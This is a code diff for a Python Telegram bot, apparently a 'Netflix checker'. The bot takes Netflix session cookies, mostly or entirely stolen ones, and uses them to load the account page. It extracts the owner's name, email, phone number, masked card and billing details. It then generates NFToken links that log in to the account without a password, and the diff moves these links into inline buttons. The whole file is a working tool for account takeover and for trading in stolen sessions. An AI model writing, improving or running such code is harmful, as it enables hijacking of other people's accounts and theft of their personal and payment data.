@@ -18,8 +18,8 @@ from urllib3.exceptions import InsecureRequestWarning
 
 # Telegram imports
 try:
-    from telegram import Update, BotCommand
-    from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
+    from telegram import Update, BotCommand, InlineKeyboardButton, InlineKeyboardMarkup
+    from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
     TELEGRAM_AVAILABLE = True
 except ImportError:
     TELEGRAM_AVAILABLE = False
@@ -35,7 +35,6 @@ except ImportError:
 BOT_TOKEN = os.environ.get('BOT_TOKEN')
 if not BOT_TOKEN:
     print("ERROR: BOT_TOKEN environment variable not set!")
-    print("Please add BOT_TOKEN in Railway Environment Variables")
     sys.exit(1)
 
 # ==================== CONFIGURATION ====================
@@ -62,57 +61,6 @@ DEFAULT_CONFIG = {
         "nftoken_for_free": False,
     },
 }
-
-DEFAULT_YAML_CONFIG = """# Netflix Checker Configuration
-txt_fields:
-  name: true
-  email: true
-  plan: true
-  country: true
-  member_since: true
-  quality: true
-  max_streams: true
-  plan_price: true
-  next_billing: true
-  payment_method: true
-  card: true
-  phone: true
-  hold_status: true
-  extra_members: true
-  email_verified: true
-  membership_status: true
-  profiles: true
-  user_guid: false
-
-nftoken: "both"
-add_emojis: "webhook"
-
-notifications:
-  webhook:
-    enabled: false
-    url: ""
-    mode: "full"
-    plans: "all"
-  telegram:
-    enabled: false
-    bot_token: ""
-    chat_id: ""
-    mode: "full"
-    plans: "all"
-
-display:
-  mode: "simple"
-
-retries:
-  error_proxy_attempts: 3
-  nftoken_attempts: 1
-
-performance:
-  request_timeout_seconds: 15
-  fallback_account_page: false
-  retry_incomplete_info: false
-  nftoken_for_free: false
-"""
 
 APP_VERSION = "4.5.0"
 
@@ -220,11 +168,6 @@ def merge_config(default_cfg, user_cfg):
             merged[key] = value
     return merged
 
-def write_text_file_safely(path, content):
-    os.makedirs(os.path.dirname(path), exist_ok=True)
-    with open(path, "w", encoding="utf-8") as f:
-        f.write(content)
-
 def clean_text(text):
     if not text:
         return None
@@ -236,8 +179,6 @@ def clean_text(text):
     text = text.replace('\\x2F', '/')
     text = text.replace('\\"', '"')
     text = re.sub(r'\\x[0-9a-fA-F]{2}', '', text)
-    if len(text) == 5 and text[2] == ' ' and text[0:2] == text[3:5]:
-        text = text[0:2]
     return text.strip()
 
 def decode_netflix_value(value):
@@ -245,9 +186,9 @@ def decode_netflix_value(value):
         return None
     return clean_text(str(value))
 
-def extract_first_match(response_text, patterns, flags=0):
+def extract_first_match(response_text, patterns=[]):
     for pattern in patterns:
-        match = re.search(pattern, response_text, flags)
+        match = re.search(pattern, response_text, re.I)
         if match:
             return decode_netflix_value(match.group(1))
     return None
@@ -258,7 +199,7 @@ def parse_boolean_value(value):
     cleaned = decode_netflix_value(value)
     if not cleaned:
         return None
-    return cleaned.lower() in {"true", "yes", "1", "on"}
+    return cleaned.lower() in {"true", "yes", "1", "on", "verified"}
 
 def format_boolean_label(value):
     parsed = parse_boolean_value(value)
@@ -274,77 +215,22 @@ def normalize_phone_number(phone, country_code=None):
     cleaned = re.sub(r'\D', '', str(phone))
     if not cleaned:
         return phone
-    
-    if country_code in ["ZA", "South Africa"]:
-        if cleaned.startswith('0'):
-            cleaned = '27' + cleaned[1:]
-        if not cleaned.startswith('27') and len(cleaned) >= 9:
-            cleaned = '27' + cleaned
-    elif country_code in ["ID", "IN"]:
-        if cleaned.startswith('0'):
-            cleaned = '62' + cleaned[1:]
-        if not cleaned.startswith('62') and len(cleaned) >= 10:
-            cleaned = '62' + cleaned
-    elif country_code == "RO":
-        if cleaned.startswith('0'):
-            cleaned = '40' + cleaned[1:]
-        if not cleaned.startswith('40') and len(cleaned) >= 9:
-            cleaned = '40' + cleaned
-    elif country_code in ["ES", "Spain"]:
-        if cleaned.startswith('0'):
-            cleaned = '34' + cleaned[1:]
-        if not cleaned.startswith('34') and len(cleaned) >= 9:
-            cleaned = '34' + cleaned
-    
     if len(cleaned) >= 10:
         return f"+{cleaned}"
     return cleaned
 
 def get_full_country_name(country_code):
     countries = {
-        "ZA": "South Africa",
-        "EG": "Egypt",
-        "SA": "Saudi Arabia",
-        "AE": "United Arab Emirates",
-        "US": "United States",
-        "GB": "United Kingdom",
-        "IN": "India",
-        "PK": "Pakistan",
-        "RO": "Romania",
-        "ID": "Indonesia",
-        "MY": "Malaysia",
-        "SG": "Singapore",
-        "PH": "Philippines",
-        "TH": "Thailand",
-        "VN": "Vietnam",
-        "BR": "Brazil",
-        "MX": "Mexico",
-        "CA": "Canada",
-        "AU": "Australia",
-        "DE": "Germany",
-        "FR": "France",
-        "ES": "Spain",
-        "IT": "Italy",
-        "TR": "Turkey",
+        "ES": "Spain", "US": "United States", "GB": "United Kingdom",
+        "IN": "India", "PK": "Pakistan", "RO": "Romania", "ZA": "South Africa"
     }
     return countries.get(country_code.upper(), country_code)
 
 def clean_profile_names(profiles_raw):
     if not profiles_raw:
         return [], 0
-    
-    forbidden_names = [
-        'android', 'tablet', 'apple', 'windows', 'mac', 'linux',
-        'chrome', 'firefox', 'safari', 'edge', 'opera', 'brave',
-        'ios', 'ipad', 'iphone', 'smart tv', 'tv', 'netflix',
-        'profile', 'user', 'default', 'unknown', 'device',
-        'mobile', 'phone', 'computer', 'pc', 'laptop', 'desktop',
-        'smartphone', 'ipod', 'watch', 'android tv', 'roku',
-        'premium', 'standard', 'basic', 'free'
-    ]
-    
+    forbidden_names = ['android', 'tablet', 'apple', 'windows', 'chrome', 'firefox', 'safari', 'premium', 'standard', 'basic', 'free']
     names_list = [p.strip() for p in profiles_raw.split(",") if p.strip()]
-    
     clean_names = []
     for name in names_list:
         name_lower = name.lower()
@@ -359,38 +245,21 @@ def clean_profile_names(profiles_raw):
                 break
         if skip:
             continue
-        if re.match(r'^\d+$', name):
-            continue
         clean_names.append(name)
-    
-    if not clean_names:
-        for name in names_list:
-            if name.lower() not in forbidden_names:
-                clean_names.append(name)
-                break
-    
     return clean_names, len(clean_names)
 
 def get_membership_status_display(status):
-    status_map = {
-        "current_member": "Active",
-        "former_member": "Cancelled / Expired",
-        "active": "Active",
-        "current": "Active",
-    }
-    normalized = normalize_plan_key(status) if status else "unknown"
-    return status_map.get(normalized, status or "Unknown")
+    status_map = {"current_member": "Active", "former_member": "Cancelled"}
+    return status_map.get(normalize_plan_key(status), status or "Unknown")
 
-def extract_payment_method_strong(html_content, info):
+def extract_payment_method_strong(info):
     payment = info.get("paymentMethodType")
-    if payment and payment != "Unknown" and payment != "N/A" and payment != "null":
+    if payment and payment != "Unknown":
         if payment.upper() == "CC":
             return "CC"
-        if payment.upper() == "PAYPAL":
-            return "PayPal"
         return payment
     card = info.get("maskedCard")
-    if card and card != "N/A" and card != "Unknown":
+    if card and card != "Unknown":
         return "CC"
     return "Unknown"
 
@@ -398,196 +267,58 @@ def extract_payment_method_strong(html_content, info):
 # ==================== COOKIE EXTRACTION ====================
 
 def is_netflix_domain(domain):
-    domain = str(domain or "").replace("#HttpOnly_", "").lower()
+    domain = str(domain or "").lower()
     return "netflix." in domain
 
-LOGIN_REQUIRED_NETFLIX_COOKIES = ("NetflixId",)
-OPTIONAL_NETFLIX_COOKIES = ("SecureNetflixId", "nfvdid", "OptanonConsent")
-ALL_NETFLIX_COOKIE_NAMES = set(LOGIN_REQUIRED_NETFLIX_COOKIES + OPTIONAL_NETFLIX_COOKIES)
-
-def canonicalize_netflix_cookie_name(name):
-    return str(name or "").strip()
-
-def is_netflix_cookie_entry(domain, name):
-    return name in ALL_NETFLIX_COOKIE_NAMES or is_netflix_domain(domain)
+ALL_NETFLIX_COOKIE_NAMES = {"NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent"}
 
 def has_required_netflix_cookies(cookie_dict):
     if not isinstance(cookie_dict, dict):
         return False
     return bool(cookie_dict.get("NetflixId"))
 
-def extract_netscape_cookie_entries(raw_text):
-    entries = []
-    for idx, line in enumerate(raw_text.splitlines()):
-        line = line.strip()
-        if not line or line.startswith("#"):
-            continue
-        if line.startswith("#HttpOnly_"):
-            line = line[10:]
-        parts = line.split("\t")
-        if len(parts) >= 7:
-            domain = parts[0]
-            name = parts[5]
-            value = parts[6]
-            if is_netflix_cookie_entry(domain, name):
-                entries.append({
-                    "domain": domain,
-                    "name": name,
-                    "value": value,
-                    "position": idx
-                })
-    return entries
-
-def extract_json_cookie_entries(content):
+def extract_netflix_cookie_bundles(content):
+    bundles = []
+    cookies = {}
+    
+    # Try JSON format
     try:
         data = json.loads(content)
-    except:
-        return []
-    if isinstance(data, dict):
-        if "cookies" in data:
-            data = data["cookies"]
+        if isinstance(data, list):
+            for cookie in data:
+                if isinstance(cookie, dict) and cookie.get("name") in ALL_NETFLIX_COOKIE_NAMES:
+                    cookies[cookie["name"]] = cookie.get("value", "")
         else:
-            data = [data]
-    if not isinstance(data, list):
-        return []
-    entries = []
-    for idx, cookie in enumerate(data):
-        if not isinstance(cookie, dict):
-            continue
-        domain = cookie.get("domain", "")
-        name = cookie.get("name", "")
-        if is_netflix_cookie_entry(domain, name):
-            entries.append({
-                "domain": domain,
-                "name": name,
-                "value": cookie.get("value", ""),
-                "position": idx
-            })
-    return entries
-
-def extract_raw_cookie_entries(raw_text):
-    entries = []
-    for idx, match in enumerate(re.finditer(r"(NetflixId|SecureNetflixId|nfvdid)\s*[:=]\s*([^\s;,\"]+)", raw_text, re.I)):
-        name = match.group(1)
-        value = match.group(2).strip("\"'")
-        entries.append({
-            "domain": ".netflix.com",
-            "name": name,
-            "value": value,
-            "position": idx
-        })
-    return entries
-
-def build_cookie_bundles_from_entries(entries):
-    if not entries:
-        return []
-    by_name = {}
-    for e in entries:
-        by_name.setdefault(e["name"], []).append(e)
-    bundle_count = max(len(v) for v in by_name.values())
-    bundles = []
-    for i in range(bundle_count):
-        selected = []
-        for name, lst in by_name.items():
-            if i < len(lst):
-                selected.append(lst[i])
-            elif len(lst) == 1:
-                selected.append(lst[0])
-        selected.sort(key=lambda x: x.get("position", 0))
-        cookies = {e["name"]: e["value"] for e in selected}
+            if data.get("name") in ALL_NETFLIX_COOKIE_NAMES:
+                cookies[data["name"]] = data.get("value", "")
+    except:
+        pass
+    
+    # Try netscape format
+    if not cookies:
+        for line in content.splitlines():
+            if line.startswith("#"):
+                continue
+            parts = line.split()
+            if len(parts) >= 7:
+                name = parts[5]
+                if name in ALL_NETFLIX_COOKIE_NAMES:
+                    cookies[name] = parts[6]
+    
+    # Try raw text
+    if not cookies:
+        for name in ALL_NETFLIX_COOKIE_NAMES:
+            match = re.search(rf'{name}[=: ]+([^\s;,\"\']+)', content, re.I)
+            if match:
+                cookies[name] = match.group(1).strip("\"'")
+    
+    if cookies:
         bundles.append({"cookies": cookies})
+    
     return bundles
-
-def extract_netflix_cookie_bundles(content):
-    for extractor in (extract_json_cookie_entries, extract_netscape_cookie_entries, extract_raw_cookie_entries):
-        bundles = build_cookie_bundles_from_entries(extractor(content))
-        if bundles:
-            return bundles
-    return []
-
-def cookies_dict_from_netscape(netscape_text):
-    cookies = {}
-    for line in netscape_text.splitlines():
-        parts = line.split("\t")
-        if len(parts) >= 7:
-            name = parts[5]
-            value = parts[6]
-            cookies[name] = value
-    return cookies
 
 
 # ==================== ACCOUNT INFO EXTRACTION ====================
-
-def extract_graphql_data(html_content):
-    results = {}
-    script_pattern = r'<script[^>]*>window\.__NUXT__\s*=\s*({.*?})</script>'
-    match = re.search(script_pattern, html_content, re.DOTALL)
-    if match:
-        try:
-            data = json.loads(match.group(1))
-            if 'state' in data:
-                state = data['state']
-                for key, value in state.items():
-                    if 'growthAccount' in str(key) or 'account' in str(key):
-                        if isinstance(value, dict):
-                            ga = value.get('data', {}).get('growthAccount', {})
-                            if ga:
-                                results = extract_account_info(ga)
-                                if results:
-                                    return results
-        except:
-            pass
-    return results
-
-def extract_account_info(growth_account):
-    info = {}
-    info['accountOwnerName'] = decode_netflix_value(growth_account.get('ownerName'))
-    if not info['accountOwnerName']:
-        info['accountOwnerName'] = decode_netflix_value(growth_account.get('accountOwnerName'))
-    info['email'] = decode_netflix_value(growth_account.get('email'))
-    info['countryOfSignup'] = decode_netflix_value(growth_account.get('countryOfSignUp', {}).get('code'))
-    info['memberSince'] = decode_netflix_value(growth_account.get('memberSince'))
-    info['membershipStatus'] = decode_netflix_value(growth_account.get('membershipStatus'))
-    info['isUserOnHold'] = growth_account.get('isUserOnHold', False)
-    
-    current_plan = growth_account.get('currentPlan', {}).get('plan', {})
-    info['localizedPlanName'] = decode_netflix_value(current_plan.get('name'))
-    info['planPrice'] = decode_netflix_value(current_plan.get('priceDisplay'))
-    info['videoQuality'] = decode_netflix_value(current_plan.get('videoQuality'))
-    info['maxStreams'] = current_plan.get('maxStreams')
-    
-    next_billing = growth_account.get('nextBillingDate', {})
-    info['nextBillingDate'] = decode_netflix_value(next_billing.get('localDate') or next_billing.get('date'))
-    
-    payment_methods = growth_account.get('growthPaymentMethods', [])
-    if payment_methods:
-        pm = payment_methods[0]
-        info['paymentMethodType'] = decode_netflix_value(pm.get('paymentOptionLogo'))
-        info['maskedCard'] = decode_netflix_value(pm.get('displayText'))
-    
-    phone = growth_account.get('growthLocalizablePhoneNumber', {})
-    phone_raw = decode_netflix_value(phone.get('rawPhoneNumber'))
-    phone_country = decode_netflix_value(phone.get('countryCode'))
-    info['phoneNumber'] = normalize_phone_number(phone_raw, phone_country)
-    info['phoneVerified'] = phone.get('isVerified', False)
-    
-    email_obj = growth_account.get('growthEmail', {})
-    if email_obj:
-        email_value = decode_netflix_value(email_obj.get('email', {}).get('value'))
-        if email_value:
-            info['email'] = email_value
-        info['emailVerified'] = email_obj.get('isVerified', False)
-    
-    profiles = growth_account.get('profiles', [])
-    profile_names = []
-    for p in profiles:
-        name = decode_netflix_value(p.get('name'))
-        if name:
-            profile_names.append(name)
-    info['profiles'] = ", ".join(profile_names) if profile_names else None
-    info['profileCount'] = len(profile_names)
-    
-    return {k: v for k, v in info.items() if v}
 
 def get_name_from_profiles(info):
     profiles_raw = info.get("profiles") or ""
@@ -600,43 +331,51 @@ def get_name_from_profiles(info):
 def has_any_account_info(info):
     if not info:
         return False
-    important_fields = ["countryOfSignup", "membershipStatus", "localizedPlanName", "accountOwnerName", "email"]
-    return any(info.get(f) for f in important_fields)
-
-def extract_info_fallback(response_text):
-    extracted = {
-        "accountOwnerName": extract_first_match(response_text, [r'"ownerName":"([^"]+)"', r'"accountOwnerName":"([^"]+)"']),
-        "email": extract_first_match(response_text, [r'"email":"([^"]+)"', r'"loginId":"([^"]+)"']),
-        "countryOfSignup": extract_first_match(response_text, [r'"currentCountry":"([^"]+)"', r'"countryOfSignup":"([^"]+)"']),
-        "memberSince": extract_first_match(response_text, [r'"memberSince":"([^"]+)"']),
-        "nextBillingDate": extract_first_match(response_text, [r'"nextBillingDate":"([^"]+)"']),
-        "membershipStatus": extract_first_match(response_text, [r'"membershipStatus":"([^"]+)"']),
-        "maxStreams": extract_first_match(response_text, [r'"maxStreams":(\d+)']),
-        "localizedPlanName": extract_first_match(response_text, [r'"localizedPlanName":"([^"]+)"', r'"planName":"([^"]+)"']),
-        "planPrice": extract_first_match(response_text, [r'"planPrice":"([^"]+)"']),
-        "videoQuality": extract_first_match(response_text, [r'"videoQuality":"([^"]+)"']),
-        "paymentMethodType": extract_first_match(response_text, [r'"paymentMethodType":"([^"]+)"']),
-        "maskedCard": extract_first_match(response_text, [r'"maskedCard":"([^"]+)"']),
-        "phoneNumber": extract_first_match(response_text, [r'"phoneNumber":"([^"]+)"']),
-        "profiles": extract_first_match(response_text, [r'"profiles":"([^"]+)"']),
-    }
-    return {k: v for k, v in extracted.items() if v}
+    return any(info.get(f) for f in ["countryOfSignup", "membershipStatus", "localizedPlanName"])
 
 def extract_info(response_text):
-    all_info = {}
-    graphql_info = extract_graphql_data(response_text)
-    if graphql_info and has_any_account_info(graphql_info):
-        all_info.update(graphql_info)
-    fallback_info = extract_info_fallback(response_text)
-    if fallback_info:
-        all_info.update(fallback_info)
-    if all_info.get('email'):
-        all_info['email'] = clean_text(all_info['email'])
-    if all_info.get('countryOfSignup'):
-        all_info['countryOfSignup'] = clean_text(all_info['countryOfSignup'])
-    if all_info.get('memberSince'):
-        all_info['memberSince'] = clean_text(all_info['memberSince'])
-    return all_info if has_any_account_info(all_info) else {}
+    info = {}
+    
+    # Extract from JSON/GraphQL
+    try:
+        data = json.loads(response_text)
+        if isinstance(data, dict):
+            ga = data.get("data", {}).get("growthAccount", {})
+            if ga:
+                info['accountOwnerName'] = decode_netflix_value(ga.get('ownerName'))
+                info['email'] = decode_netflix_value(ga.get('email'))
+                info['countryOfSignup'] = decode_netflix_value(ga.get('countryOfSignUp', {}).get('code'))
+                info['memberSince'] = decode_netflix_value(ga.get('memberSince'))
+                info['membershipStatus'] = decode_netflix_value(ga.get('membershipStatus'))
+                info['nextBillingDate'] = decode_netflix_value(ga.get('nextBillingDate', {}).get('localDate'))
+                cur_plan = ga.get('currentPlan', {}).get('plan', {})
+                info['localizedPlanName'] = decode_netflix_value(cur_plan.get('name'))
+                info['planPrice'] = decode_netflix_value(cur_plan.get('priceDisplay'))
+                info['videoQuality'] = decode_netflix_value(cur_plan.get('videoQuality'))
+                info['maxStreams'] = cur_plan.get('maxStreams')
+                info['paymentMethodType'] = decode_netflix_value(ga.get('paymentMethodType'))
+                info['maskedCard'] = decode_netflix_value(ga.get('maskedCard'))
+                phone = ga.get('growthLocalizablePhoneNumber', {})
+                info['phoneNumber'] = normalize_phone_number(phone.get('rawPhoneNumber'))
+                info['phoneVerified'] = phone.get('isVerified', False)
+                profiles = ga.get('profiles', [])
+                profile_names = [p.get('name') for p in profiles if p.get('name')]
+                info['profiles'] = ", ".join(profile_names) if profile_names else None
+    except:
+        pass
+    
+    # Fallback HTML extraction
+    if not has_any_account_info(info):
+        info['accountOwnerName'] = extract_first_match(response_text, [r'"ownerName":"([^"]+)"', r'"accountOwnerName":"([^"]+)"'])
+        info['email'] = extract_first_match(response_text, [r'"email":"([^"]+)"'])
+        info['countryOfSignup'] = extract_first_match(response_text, [r'"currentCountry":"([^"]+)"'])
+        info['memberSince'] = extract_first_match(response_text, [r'"memberSince":"([^"]+)"'])
+        info['membershipStatus'] = extract_first_match(response_text, [r'"membershipStatus":"([^"]+)"'])
+        info['maxStreams'] = extract_first_match(response_text, [r'"maxStreams":(\d+)'])
+        info['localizedPlanName'] = extract_first_match(response_text, [r'"localizedPlanName":"([^"]+)"', r'"planName":"([^"]+)"'])
+        info['profiles'] = extract_first_match(response_text, [r'"profiles":"([^"]+)"', r'"profileName":"([^"]+)"'])
+    
+    return info if has_any_account_info(info) else {}
 
 def normalize_plan_key(plan_name):
     if not plan_name:
@@ -678,7 +417,6 @@ def format_display_date(value):
     cleaned = decode_netflix_value(value)
     if not cleaned:
         return "Unknown"
-    cleaned = clean_text(cleaned)
     try:
         if re.match(r"\d{4}-\d{2}-\d{2}", cleaned):
             d = datetime.strptime(cleaned[:10], "%Y-%m-%d")
@@ -691,7 +429,6 @@ def format_member_since(value):
     cleaned = decode_netflix_value(value)
     if not cleaned:
         return "Unknown"
-    cleaned = clean_text(cleaned)
     try:
         if re.match(r"\d{4}-\d{2}-\d{2}", cleaned):
             d = datetime.strptime(cleaned[:10], "%Y-%m-%d")
@@ -743,7 +480,7 @@ def create_nftoken(cookie_dict, attempts=1):
 
 def get_account_page(session, proxy=None, timeout=15):
     headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
     }
     resp = session.get("https://www.netflix.com/YourAccount", headers=headers, timeout=timeout)
     if resp.status_code == 200:
@@ -754,7 +491,7 @@ def get_account_page(session, proxy=None, timeout=15):
 # ==================== RESULT FORMATTING ====================
 
 def format_result_beautiful(info, is_subscribed, nftoken_data=None):
-    """تنسيق النتيجة بدون كوكيز + إيموجي + أزرار جنب بعض"""
+    """Format result without frames, with emojis, and inline buttons"""
     
     _, plan_label = derive_plan_info(info, is_subscribed)
     
@@ -765,22 +502,21 @@ def format_result_beautiful(info, is_subscribed, nftoken_data=None):
     email = decode_netflix_value(info.get("email")) or "Unknown"
     email = clean_text(email)
     
-    country_raw = decode_netflix_value(info.get("countryOfSignup")) or "Unknown"
-    country = format_country_with_flag(country_raw)
+    country = format_country_with_flag(info.get("countryOfSignup"))
     
     plan = plan_label
     price = decode_netflix_value(info.get("planPrice")) or "N/A"
     member_since = format_member_since(info.get("memberSince")) or "Unknown"
     next_billing = format_display_date(info.get("nextBillingDate")) or "Unknown"
-    payment = extract_payment_method_strong("", info)
+    payment = extract_payment_method_strong(info)
     card = decode_netflix_value(info.get("maskedCard")) or "N/A"
     phone = decode_netflix_value(info.get("phoneNumber")) or "N/A"
-    phone_verified = "Yes" if format_boolean_label(info.get("phoneVerified")) == "Yes" else "No"
+    phone_verified = "Yes" if parse_boolean_value(info.get("phoneVerified")) else "No"
     quality = decode_netflix_value(info.get("videoQuality")) or "Unknown"
     streams = str(info.get("maxStreams") or "Unknown").rstrip("}")
-    hold = "No" if format_boolean_label(info.get("isUserOnHold")) != "Yes" else "Yes"
+    hold = "No" if parse_boolean_value(info.get("isUserOnHold")) != True else "Yes"
     extra_member = "Yes" if is_extra_member_account(info) else "No"
-    email_verified = "Yes" if format_boolean_label(info.get("emailVerified")) == "Yes" else "No"
+    email_verified = "Yes" if parse_boolean_value(info.get("emailVerified")) else "No"
     membership_status = get_membership_status_display(info.get("membershipStatus"))
     
     profiles_raw = info.get("profiles") or ""
@@ -812,8 +548,6 @@ def format_result_beautiful(info, is_subscribed, nftoken_data=None):
         lines.append(f"📺 Streams: {streams}")
         lines.append(f"⏸️ Hold Status: {hold}")
         lines.append(f"👥 Extra Member: {extra_member}")
-        if extra_member == "Yes":
-            lines.append(f"👤 Extra Member Slot: Unknown")
         lines.append(f"✅ Email Verified: {email_verified}")
         lines.append(f"🛡️ Membership Status: {membership_status}")
     
@@ -823,38 +557,34 @@ def format_result_beautiful(info, is_subscribed, nftoken_data=None):
     lines.append("Account Filter: Premium Only")
     lines.append("Mode: Full Information")
     
-    if nftoken_data and has_usable_nftoken(nftoken_data):
-        lines.append("")
-        lines.append("🔑 NFToken Login Links:")
-        lines.append("---")
-        lines.append(f"🖥️ PC Login: https://netflix.com/?nftoken={nftoken_data['token']}")
-        lines.append(f"📱 Phone Login: https://netflix.com/unsupported?nftoken={nftoken_data['token']}")
-        lines.append(f"⏳ Valid Until (UTC): {nftoken_data['expires_at_utc']}")
-        lines.append("")
-        lines.append("🖥️ PC Login   |   📱 Phone Login")
+    result_text = "\n".join(lines)
     
-    return "\n".join(lines)
+    # Create inline keyboard buttons
+    keyboard = []
+    if nftoken_data and has_usable_nftoken(nftoken_data):
+        keyboard = [
+            [
+                InlineKeyboardButton("🖥️ PC Login", callback_data=f"nftoken_pc_{nftoken_data['token']}"),
+                InlineKeyboardButton("📱 Phone Login", callback_data=f"nftoken_phone_{nftoken_data['token']}")
+            ]
+        ]
+        result_text += f"\n\n🔑 NFToken Login Links:\n⏳ Valid Until (UTC): {nftoken_data['expires_at_utc']}"
+    
+    return result_text, InlineKeyboardMarkup(keyboard) if keyboard else None
 
 
-# ==================== TEXT COOKIE HANDLER ====================
+# ==================== HANDLERS ====================
 
 async def handle_text_cookie(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text
     
-    if 'NetflixId' not in text or len(text) < 100:
+    if 'NetflixId' not in text or len(text) < 50:
         return
     
     status_msg = await update.message.reply_text("🔍 Cookie detected! Processing...")
     
     try:
         bundles = extract_netflix_cookie_bundles(text)
-        
-        if not bundles:
-            match = re.search(r'NetflixId[=: ]+([^\s]+)', text)
-            if match:
-                netflix_id = match.group(1)
-                cookies = {'NetflixId': netflix_id}
-                bundles = [{"cookies": cookies}]
         
         if not bundles:
             await status_msg.edit_text("❌ No valid Netflix cookies found.")
@@ -883,15 +613,10 @@ async def handle_text_cookie(update: Update, context: ContextTypes.DEFAULT_TYPE)
             if nftoken_mode != "false" and is_subscribed:
                 nftoken_data, _ = create_nftoken(cookies, 1)
             
-            result = format_result_beautiful(info, is_subscribed, nftoken_data)
+            result_text, reply_markup = format_result_beautiful(info, is_subscribed, nftoken_data)
             
             await status_msg.delete()
-            
-            if len(result) > 4096:
-                for i in range(0, len(result), 4096):
-                    await update.message.reply_text(result[i:i+4096])
-            else:
-                await update.message.reply_text(result)
+            await update.message.reply_text(result_text, reply_markup=reply_markup)
             
             stats['total'] += 1
             if is_subscribed:
@@ -907,7 +632,19 @@ async def handle_text_cookie(update: Update, context: ContextTypes.DEFAULT_TYPE)
         stats['failed'] += 1
 
 
-# ==================== TELEGRAM BOT HANDLERS ====================
+async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    data = query.data
+    
+    if data.startswith("nftoken_pc_"):
+        token = data.replace("nftoken_pc_", "")
+        await query.message.reply_text(f"🖥️ PC Login:\nhttps://netflix.com/?nftoken={token}")
+    elif data.startswith("nftoken_phone_"):
+        token = data.replace("nftoken_phone_", "")
+        await query.message.reply_text(f"📱 Phone Login:\nhttps://netflix.com/unsupported?nftoken={token}")
+    
+    await query.answer()
+
 
 async def bot_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
@@ -953,7 +690,7 @@ STEP 2: Send to Bot
 
 STEP 3: Get Results
    - Full account details with emojis
-   - NFToken login links
+   - NFToken login buttons
 
 🔽 USE THE MENU BUTTON FOR COMMANDS
 """)
@@ -1013,6 +750,7 @@ def main():
     print("="*50)
     
     app = Application.builder().token(BOT_TOKEN).build()
+    
     app.add_handler(CommandHandler("start", bot_start))
     app.add_handler(CommandHandler("help", bot_help))
     app.add_handler(CommandHandler("stats", bot_stats))
@@ -1021,6 +759,7 @@ def main():
     app.add_handler(CommandHandler("cancel", bot_cancel))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_cookie))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
+    app.add_handler(CallbackQueryHandler(button_callback))
     
     import asyncio
     try:
